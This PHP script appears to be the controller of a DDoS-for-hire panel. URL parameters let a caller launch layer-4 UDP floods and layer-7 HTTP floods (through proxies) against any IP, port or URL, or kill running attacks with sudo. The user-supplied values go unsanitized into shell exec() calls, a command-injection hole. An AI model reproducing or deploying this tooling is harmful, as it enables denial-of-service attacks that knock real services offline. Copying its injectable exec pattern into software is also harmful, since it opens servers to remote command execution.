<?php
if (isset($_GET['type']) && $_GET['type'] === 'l4') {
    if (isset($_GET['action']) && $_GET['action'] === 'kill') {
        exec('sudo pkill -9 -f python3', $output, $return_var);

        if ($return_var == 0) {
            echo "All DDoS Processes Killed Successfully";
        } else {
            echo "All DDoS Processes Killed Successfully";
        }
    } elseif (isset($_GET['ip']) && isset($_GET['port']) && isset($_GET['thread']) && isset($_GET['time'])) {
        $ip = $_GET['ip'];
        $port = $_GET['port'];
        $thread = $_GET['thread'];
        $time = $_GET['time'];

        $command = "nohup python3 udp.py $ip $port $thread $time > /dev/null 2>&1 &";
        exec($command, $output, $return_var);

        if ($return_var == 0) {
            echo "ATTACK SENT SUCCESS => [$ip:$port] in [$time] seconds\n";
            foreach ($output as $line) {
                echo $line . "<br>";
            }
        } else {
            echo "ATTACK SENT FALSE!!!\n";
        }
    } else {
        echo "Please input ip, port, thread, time in URL";
    }
} 
if (isset($_GET['type']) && $_GET['type'] === 'l7') {
    if (isset($_GET['action']) && $_GET['action'] === 'kill') {
        exec('sudo pkill -9 -f node', $output, $return_var);

        if ($return_var == 0) {
            echo "All DDoS Processes Killed Successfully";
        } else {
            echo "All DDoS Processes Killed Successfully";
        }
    } elseif (isset($_GET['url']) && isset($_GET['method']) && isset($_GET['thread']) && isset($_GET['time'])) {
        $url = $_GET['url'];
        $method = $_GET['method'];
        $thread = $_GET['thread'];
        $time = $_GET['time'];

        $command = "nohup node $method.js $url $time $thread proxy.txt > /dev/null 2>&1 &";
        exec($command, $output, $return_var);

        if ($return_var == 0) {
            echo "ATTACK SENT SUCCESS => [$url] in [$time] seconds\n";
            foreach ($output as $line) {
                echo $line . "<br>";
            }
        } else {
            echo "ATTACK SENT FALSE!!!\n";
        }
    } else {
        echo "Please input url, port, thread, time in URL";
    }
}
?>
